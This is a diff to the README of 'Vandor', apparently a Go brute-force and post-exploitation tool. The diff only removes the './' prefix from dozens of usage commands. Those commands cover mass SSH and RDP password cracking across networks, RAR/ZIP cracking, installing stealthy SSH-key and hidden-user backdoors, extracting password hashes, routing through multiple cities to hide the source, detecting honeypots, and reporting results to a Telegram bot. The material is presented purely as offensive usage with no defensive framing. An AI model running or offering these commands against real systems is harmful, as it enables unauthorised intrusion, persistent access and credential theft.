@@ -69,56 +69,56 @@ go build -ldflags="-s -w" -o Vandor main.go
 
 ```bash
 # Scan specific ports
-./Vandor -targets 192.168.1.1 -ps 22,80,443
+Vandor -targets 192.168.1.1 -ps 22,80,443
 
 # Scan with default ports (22,3389)
-./Vandor -targets 192.168.1.0/24 -ps
+Vandor -targets 192.168.1.0/24 -ps
 
 # Scan port range
-./Vandor -targets 192.168.1.1 -ps 20-100
+Vandor -targets 192.168.1.1 -ps 20-100
 
 # Fast port scan with custom threads
-./Vandor -targets 192.168.1.0/24 -ps 22,80,443 -ps-threads 5000 -ps-timeout 50
+Vandor -targets 192.168.1.0/24 -ps 22,80,443 -ps-threads 5000 -ps-timeout 50
 ```
 
 ### Alive Host Check
 
 ```bash
 # Check if hosts are alive
-./Vandor -targets 192.168.1.0/24 -alive
+Vandor -targets 192.168.1.0/24 -alive
 
 # Check on custom port
-./Vandor -targets 192.168.1.0/24 -alive -port 80
+Vandor -targets 192.168.1.0/24 -alive -port 80
 ```
 
 ### SSH Cracking
 
 ```bash
 # Basic SSH attack
-./Vandor -targets 192.168.1.100 -users root -passwords admin123
+Vandor -targets 192.168.1.100 -users root -passwords admin123
 
 # SSH with wordlists
-./Vandor -targets hosts.txt -users users.txt -passwords rockyou.txt
+Vandor -targets hosts.txt -users users.txt -passwords rockyou.txt
 
 # Fast SSH cracking with custom threads
-./Vandor -targets hosts.txt -users users.txt -passwords rockyou.txt \
+Vandor -targets hosts.txt -users users.txt -passwords rockyou.txt \
   -crack-threads 10000 -crack-timeout 5
 
 # CIDR network
-./Vandor -targets 192.168.1.0/24 -users admin -passwords admin123
+Vandor -targets 192.168.1.0/24 -users admin -passwords admin123
 
 # Custom SSH port
-./Vandor -targets 10.0.0.5:2222 -users root -passwords pass.txt
+Vandor -targets 10.0.0.5:2222 -users root -passwords pass.txt
 ```
 
 ### RDP Cracking
 
 ```bash
 # RDP attack
-./Vandor -targets 10.0.0.5 -protocol rdp -users admin -passwords pass.txt
+Vandor -targets 10.0.0.5 -protocol rdp -users admin -passwords pass.txt
 
 # Fast RDP cracking
-./Vandor -targets hosts.txt -users admin -passwords pass.txt \
+Vandor -targets hosts.txt -users admin -passwords pass.txt \
   -protocol rdp -crack-threads 8000 -crack-timeout 8
 ```
 
@@ -126,34 +126,34 @@ go build -ldflags="-s -w" -o Vandor main.go
 
 ```bash
 # Crack RAR file
-./Vandor -rar archive.rar -rar-dict rockyou.txt
+Vandor -rar archive.rar -rar-dict rockyou.txt
 
 # Crack ZIP file
-./Vandor -zip archive.zip -zip-dict rockyou.txt
+Vandor -zip archive.zip -zip-dict rockyou.txt
 ```
 
 ### Post-Exploitation
 
 ```bash
 # With backdoor installation
-./Vandor -targets 10.0.0.5 -users root -passwords pass.txt \
+Vandor -targets 10.0.0.5 -users root -passwords pass.txt \
   -backdoor -backdoor-type ssh-key
 
 # All backdoor types
-./Vandor -targets 10.0.0.5 -users root -passwords pass.txt \
+Vandor -targets 10.0.0.5 -users root -passwords pass.txt \
   -backdoor -backdoor-type all
 
 # Gather system info
-./Vandor -targets 10.0.0.5 -users root -passwords pass.txt -post-exploit
+Vandor -targets 10.0.0.5 -users root -passwords pass.txt -post-exploit
 
 # Extract password hashes
-./Vandor -targets 10.0.0.5 -users root -passwords pass.txt -extract-hash
+Vandor -targets 10.0.0.5 -users root -passwords pass.txt -extract-hash
 ```
 
 ### Telegram Notifications
 
 ```bash
-./Vandor -targets targets.txt -users users.txt -passwords pass.txt \
+Vandor -targets targets.txt -users users.txt -passwords pass.txt \
   -bot-token "YOUR_BOT_TOKEN" -chat-id "YOUR_CHAT_ID" -notify 1
 ```
 
@@ -270,35 +270,35 @@ go build -ldflags="-s -w" -o Vandor main.go
 Standard dictionary attack.
 
 ```bash
-./Vandor -targets host.txt -users users.txt -passwords pass.txt -attack-mode normal
+Vandor -targets host.txt -users users.txt -passwords pass.txt -attack-mode normal
 ```
 
 ### Null Mode
 Try empty password.
 
 ```bash
-./Vandor -targets 10.0.0.5 -users root -attack-mode null
+Vandor -targets 10.0.0.5 -users root -attack-mode null
 ```
 
 ### UserAsPass Mode
 Password equals username.
 
 ```bash
-./Vandor -targets 10.0.0.5 -users admin -attack-mode userpass
+Vandor -targets 10.0.0.5 -users admin -attack-mode userpass
 ```
 
 ### Reverse Mode
 Password equals reversed username.
 
 ```bash
-./Vandor -targets 10.0.0.5 -users admin -attack-mode reverse
+Vandor -targets 10.0.0.5 -users admin -attack-mode reverse
 ```
 
 ### Mass PWN Mode
 All combinations simultaneously.
 
 ```bash
-./Vandor -targets hosts.txt -users users.txt -passwords pass.txt -mass-pwn
+Vandor -targets hosts.txt -users users.txt -passwords pass.txt -mass-pwn
 ```
 
 ---
@@ -306,7 +306,7 @@ All combinations simultaneously.
 ## 🍯 Honeypot Detection
 
 ```bash
-./Vandor -targets suspicious.net -users test -passwords test123 -honeypot
+Vandor -targets suspicious.net -users test -passwords test123 -honeypot
 ```
 
 Detects honeypots using:
@@ -324,15 +324,15 @@ Detects honeypots using:
 ### RAR
 
 ```bash
-./Vandor -rar archive.rar -rar-dict rockyou.txt
-./Vandor -rar secret.rar -rar-dict passwords.txt -rar-workers 2000
+Vandor -rar archive.rar -rar-dict rockyou.txt
+Vandor -rar secret.rar -rar-dict passwords.txt -rar-workers 2000
 ```
 
 ### ZIP
 
 ```bash
-./Vandor -zip backup.zip -zip-dict rockyou.txt
-./Vandor -zip protected.zip -zip-dict rockyou.txt -zip-workers 1000
+Vandor -zip backup.zip -zip-dict rockyou.txt
+Vandor -zip protected.zip -zip-dict rockyou.txt -zip-workers 1000
 ```
 
 ---
@@ -353,16 +353,16 @@ Detects honeypots using:
 
 ```bash
 # SSH Key Backdoor (Most Stealthy)
-./Vandor -targets target.com -users root -passwords pass.txt \
+Vandor -targets target.com -users root -passwords pass.txt \
   -backdoor -backdoor-type ssh-key
 
 # Hidden User Backdoor
-./Vandor -targets target.com -users root -passwords pass.txt \
+Vandor -targets target.com -users root -passwords pass.txt \
   -backdoor -backdoor-type hidden-user \
   -backdoor-user sysupdate -backdoor-pass "P@ssw0rd123!"
 
 # Deploy Everything
-./Vandor -targets target.com -users root -passwords pass.txt \
+Vandor -targets target.com -users root -passwords pass.txt \
   -backdoor -backdoor-type all -backdoor-port 22222
 ```
 
@@ -371,7 +371,7 @@ Detects honeypots using:
 ## 📱 Telegram Notifications
 
 ```bash
-./Vandor -targets targets.txt -users users.txt -passwords pass.txt \
+Vandor -targets targets.txt -users users.txt -passwords pass.txt \
   -bot-token "YOUR_BOT_TOKEN" -chat-id "YOUR_CHAT_ID" -notify 1
 ```
 
@@ -424,15 +424,15 @@ Detects honeypots using:
 
 ```bash
 # Fast port scan + fast cracking
-./Vandor -targets 192.168.1.0/24 -ps 22,3389 -ps-threads 10000 -ps-timeout 30 \
+Vandor -targets 192.168.1.0/24 -ps 22,3389 -ps-threads 10000 -ps-timeout 30 \
   -users root -passwords rockyou.txt -crack-threads 15000 -crack-timeout 5
 
 # Ultra fast for local network
-./Vandor -targets 192.168.1.0/24 -ps -ps-threads 20000 -ps-timeout 20 \
+Vandor -targets 192.168.1.0/24 -ps -ps-threads 20000 -ps-timeout 20 \
   -users users.txt -passwords pass.txt -crack-threads 20000 -crack-timeout 3
 
 # Conservative for internet targets
-./Vandor -targets targets.txt -users users.txt -passwords pass.txt \
+Vandor -targets targets.txt -users users.txt -passwords pass.txt \
   -crack-threads 5000 -crack-timeout 15
 ```
 
@@ -444,111 +444,111 @@ Detects honeypots using:
 
 ```bash
 # Port scan single IP
-./Vandor -targets 192.168.1.1 -ps
+Vandor -targets 192.168.1.1 -ps
 
 # Port scan single IP with specific ports
-./Vandor -targets 192.168.1.1 -ps 22,80,443,8080
+Vandor -targets 192.168.1.1 -ps 22,80,443,8080
 
 # Port scan single IP with range
-./Vandor -targets 192.168.1.1 -ps 20-100
+Vandor -targets 192.168.1.1 -ps 20-100
 
 # Alive check single IP
-./Vandor -targets 192.168.1.1 -alive
+Vandor -targets 192.168.1.1 -alive
 
 # SSH crack single IP
-./Vandor -targets 192.168.1.1 -users root -passwords admin123
+Vandor -targets 192.168.1.1 -users root -passwords admin123
 
 # SSH crack single IP with custom port
-./Vandor -targets 192.168.1.1:2222 -users root -passwords pass.txt
+Vandor -targets 192.168.1.1:2222 -users root -passwords pass.txt
 
 # RDP crack single IP
-./Vandor -targets 192.168.1.1 -protocol rdp -users admin -passwords pass.txt
+Vandor -targets 192.168.1.1 -protocol rdp -users admin -passwords pass.txt
 
 # RDP crack single IP with custom port
-./Vandor -targets 192.168.1.1:3389 -protocol rdp -users admin -passwords pass.txt
+Vandor -targets 192.168.1.1:3389 -protocol rdp -users admin -passwords pass.txt
 ```
 
 ### CIDR Network Scans
 
 ```bash
 # Port scan CIDR
-./Vandor -targets 192.168.1.0/24 -ps
+Vandor -targets 192.168.1.0/24 -ps
 
 # Port scan CIDR with specific ports
-./Vandor -targets 192.168.1.0/24 -ps 22,80,443
+Vandor -targets 192.168.1.0/24 -ps 22,80,443
 
 # Alive check CIDR
-./Vandor -targets 192.168.1.0/24 -alive
+Vandor -targets 192.168.1.0/24 -alive
 
 # SSH crack CIDR
-./Vandor -targets 192.168.1.0/24 -users root -passwords pass.txt
+Vandor -targets 192.168.1.0/24 -users root -passwords pass.txt
 
 # SSH crack CIDR with wordlists
-./Vandor -targets 192.168.1.0/24 -users users.txt -passwords rockyou.txt
+Vandor -targets 192.168.1.0/24 -users users.txt -passwords rockyou.txt
 
 # RDP crack CIDR
-./Vandor -targets 192.168.1.0/24 -protocol rdp -users admin -passwords pass.txt
+Vandor -targets 192.168.1.0/24 -protocol rdp -users admin -passwords pass.txt
 ```
 
 ### File-Based Targets
 
 ```bash
 # Port scan from file
-./Vandor -targets hosts.txt -ps
+Vandor -targets hosts.txt -ps
 
 # Alive check from file
-./Vandor -targets hosts.txt -alive
+Vandor -targets hosts.txt -alive
 
 # SSH crack from file
-./Vandor -targets hosts.txt -users users.txt -passwords rockyou.txt
+Vandor -targets hosts.txt -users users.txt -passwords rockyou.txt
 
 # RDP crack from file
-./Vandor -targets hosts.txt -protocol rdp -users users.txt -passwords pass.txt
+Vandor -targets hosts.txt -protocol rdp -users users.txt -passwords pass.txt
 
 # Port scan + SSH crack from files
-./Vandor -targets hosts.txt -ps 22 -users users.txt -passwords rockyou.txt
+Vandor -targets hosts.txt -ps 22 -users users.txt -passwords rockyou.txt
 ```
 
 ### Combined Operations
 
 ```bash
 # Port scan then SSH crack
-./Vandor -targets 192.168.1.0/24 -ps 22 -users root -passwords admin123
+Vandor -targets 192.168.1.0/24 -ps 22 -users root -passwords admin123
 
 # Alive check then SSH crack
-./Vandor -targets 192.168.1.0/24 -alive -users root -passwords admin123
+Vandor -targets 192.168.1.0/24 -alive -users root -passwords admin123
 
 # Full workflow: scan, alive check, crack
-./Vandor -targets 192.168.1.0/24 -ps 22 -alive -users root -passwords pass.txt
+Vandor -targets 192.168.1.0/24 -ps 22 -alive -users root -passwords pass.txt
 
 # Skip alive check for faster cracking
-./Vandor -targets targets.txt -users users.txt -passwords pass.txt -skip-alive
+Vandor -targets targets.txt -users users.txt -passwords pass.txt -skip-alive
 ```
 
 ### Attack Mode Examples
 
 ```bash
 # Null password attack
-./Vandor -targets 10.0.0.5 -users root -attack-mode null
+Vandor -targets 10.0.0.5 -users root -attack-mode null
 
 # User as password
-./Vandor -targets 10.0.0.5 -users admin -attack-mode userpass
+Vandor -targets 10.0.0.5 -users admin -attack-mode userpass
 
 # Reverse username as password
-./Vandor -targets 10.0.0.5 -users admin -attack-mode reverse
+Vandor -targets 10.0.0.5 -users admin -attack-mode reverse
 
 # Mass pwn (all combinations)
-./Vandor -targets hosts.txt -users users.txt -passwords pass.txt -mass-pwn
+Vandor -targets hosts.txt -users users.txt -passwords pass.txt -mass-pwn
 
 # Smart password generation
-./Vandor -targets 10.0.0.5 -users root -passwords pass.txt -smart-pass
+Vandor -targets 10.0.0.5 -users root -passwords pass.txt -smart-pass
 ```
 
 ### Credentials File Format
 
 ```bash
 # Single user:pass format
-./Vandor -targets 10.0.0.5 -creds credentials.txt
+Vandor -targets 10.0.0.5 -creds credentials.txt
 
 # credentials.txt content:
 # root:password123
@@ -556,27 +556,27 @@ Detects honeypots using:
 # user:pass
 
 # With protocol
-./Vandor -targets 10.0.0.5 -protocol ssh -creds credentials.txt
+Vandor -targets 10.0.0.5 -protocol ssh -creds credentials.txt
 ```
 
 ### Resume Support
 
 ```bash
 # First attack (creates checkpoint)
-./Vandor -targets hosts.txt -users users.txt -passwords rockyou.txt
+Vandor -targets hosts.txt -users users.txt -passwords rockyou.txt
 
 # Resume after interruption
-./Vandor -targets hosts.txt -users users.txt -passwords rockyou.txt -resume
+Vandor -targets hosts.txt -users users.txt -passwords rockyou.txt -resume
 ```
 
 ### Honeypot Detection
 
 ```bash
 # Enable honeypot detection
-./Vandor -targets suspicious.net -users test -passwords test123 -honeypot
+Vandor -targets suspicious.net -users test -passwords test123 -honeypot
 
 # With Telegram notifications
-./Vandor -targets targets.txt -users users.txt -passwords pass.txt \
+Vandor -targets targets.txt -users users.txt -passwords pass.txt \
   -honeypot -bot-token "TOKEN" -chat-id "ID" -notify 1
 ```
 
@@ -584,7 +584,7 @@ Detects honeypots using:
 
 ```bash
 # Full post-exploitation with all features
-./Vandor -targets target.com -users root -passwords pass.txt \
+Vandor -targets target.com -users root -passwords pass.txt \
   -post-exploit \
   -extract-hash \
   -scan-network \
@@ -593,36 +593,36 @@ Detects honeypots using:
   -bot-token "TOKEN" -chat-id "ID" -notify 1
 
 # Extract hashes only
-./Vandor -targets target.com -users root -passwords pass.txt -extract-hash
+Vandor -targets target.com -users root -passwords pass.txt -extract-hash
 
 # Network mapping only
-./Vandor -targets target.com -users root -passwords pass.txt -scan-network
+Vandor -targets target.com -users root -passwords pass.txt -scan-network
 
 # Generate auto-login script
-./Vandor -targets target.com -users root -passwords pass.txt -gen-script
+Vandor -targets target.com -users root -passwords pass.txt -gen-script
 
 # Gather system info
-./Vandor -targets target.com -users root -passwords pass.txt -post-exploit
+Vandor -targets target.com -users root -passwords pass.txt -post-exploit
 ```
 
 ### Multi-City Routing
 
 ```bash
 # Route through multiple cities
-./Vandor -targets target.com -users root -passwords pass.txt -multi-city
+Vandor -targets target.com -users root -passwords pass.txt -multi-city
 
 # With other features
-./Vandor -targets target.com -users root -passwords pass.txt -multi-city -post-exploit
+Vandor -targets target.com -users root -passwords pass.txt -multi-city -post-exploit
 ```
 
 ### Real-Time Monitoring
 
 ```bash
 # Enable monitoring
-./Vandor -targets hosts.txt -users users.txt -passwords pass.txt -monitor
+Vandor -targets hosts.txt -users users.txt -passwords pass.txt -monitor
 
 # With performance tuning
-./Vandor -targets hosts.txt -users users.txt -passwords pass.txt \
+Vandor -targets hosts.txt -users users.txt -passwords pass.txt \
   -monitor -crack-threads 10000 -crack-timeout 5
 ```
 
@@ -630,20 +630,20 @@ Detects honeypots using:
 
 ```bash
 # JSON export (default)
-./Vandor -targets host.txt -users users.txt -passwords pass.txt -json
+Vandor -targets host.txt -users users.txt -passwords pass.txt -json
 
 # CSV export
-./Vandor -targets host.txt -users users.txt -passwords pass.txt -csv
+Vandor -targets host.txt -users users.txt -passwords pass.txt -csv
 
 # Both formats
-./Vandor -targets host.txt -users users.txt -passwords pass.txt -json -csv
+Vandor -targets host.txt -users users.txt -passwords pass.txt -json -csv
 ```
 
 ### Complete Production Example
 
 ```bash
 # Full attack with all features
-./Vandor -targets targets.txt \
+Vandor -targets targets.txt \
   -users users.txt \
   -passwords rockyou.txt \
   -protocol ssh \
@@ -695,11 +695,11 @@ Detects honeypots using:
 
 ### Q: Can I scan a single port?
 
-**A:** Yes: `./Vandor -targets 192.168.1.1 -ps 22`
+**A:** Yes: `Vandor -targets 192.168.1.1 -ps 22`
 
 ### Q: Can I scan a range of ports?
 
-**A:** Yes: `./Vandor -targets 192.168.1.1 -ps 20-100`
+**A:** Yes: `Vandor -targets 192.168.1.1 -ps 20-100`
 
 ### Q: What's the default port scan?
 
@@ -707,7 +707,7 @@ Detects honeypots using:
 
 ### Q: Can I use credentials file with RDP?
 
-**A:** Yes: `./Vandor -targets 10.0.0.5 -protocol rdp -creds creds.txt`
+**A:** Yes: `Vandor -targets 10.0.0.5 -protocol rdp -creds creds.txt`
 
 ### Q: What if I get "too many open files"?
 
